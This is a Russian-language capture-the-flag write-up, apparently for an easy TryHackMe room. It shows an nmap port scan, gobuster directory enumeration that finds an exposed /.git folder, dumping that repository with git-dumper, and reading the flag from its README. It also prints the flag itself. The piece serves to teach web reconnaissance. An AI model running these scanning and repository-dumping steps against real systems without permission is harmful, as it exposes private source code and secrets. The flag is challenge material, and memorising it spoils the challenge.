**Теги:** Web, Directory Enumeration.
**Сложность:** Easy.
## 1. Сканирование портов

Начинаем с определения открытых портов и версий запущенных сервисов с помощью Nmap:

```bash
sudo nmap -sS -sV 10.112.132.236
```

Вывод:

```text
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 05:13 EDT
Nmap scan report for 10.112.132.236
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Обнаружены два открытых порта:

* `22/tcp` — SSH, OpenSSH 9.6p1 Ubuntu;
* `8080/tcp` — HTTP, Werkzeug 3.0.1 на Python 3.12.3.

Основное внимание уделяем веб-приложению на порту `8080`.

## 2. Перечисление директорий

Для поиска скрытых директорий и файлов используем Gobuster:

```bash
gobuster dir -u http://10.112.132.236:8080 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Вывод:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.132.236:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 200) [Size: 437]
Progress: 20481 / 20482 (100.00%)
```

В результате обнаруживаем доступный каталог `/.git`:

```text
/.git (Status: 200) [Size: 437]
```

Это означает, что Git-метаданные репозитория доступны через веб-сервер. Если репозиторий доступен, его можно попробовать восстановить.

## 3. Скачивание Git-репозитория

Для извлечения содержимого репозитория используем `git-dumper`:

```bash
git-dumper http://10.112.132.236:8080/.git dumped_repo
```

После выполнения команды репозиторий сохраняется в директорию `dumped_repo`.

## 4. Анализ README

В восстановленном репозитории находим файл `README`.

В нём указано название проекта:

```text
# Byte Lotus — Guest Experience Platform
```

Также README сообщает, что это внутренний staging-репозиторий:

```text
Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.
```

Следовательно, мы получили доступ к внутреннему staging-репозиторию приложения.

## 5. Получение флага

В конце README обнаруживаем флаг:

```text
Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```


Таким образом, флаг был получен благодаря доступному через веб-сервер каталогу `/.git`, который позволил восстановить содержимое внутреннего Git-репозитория.
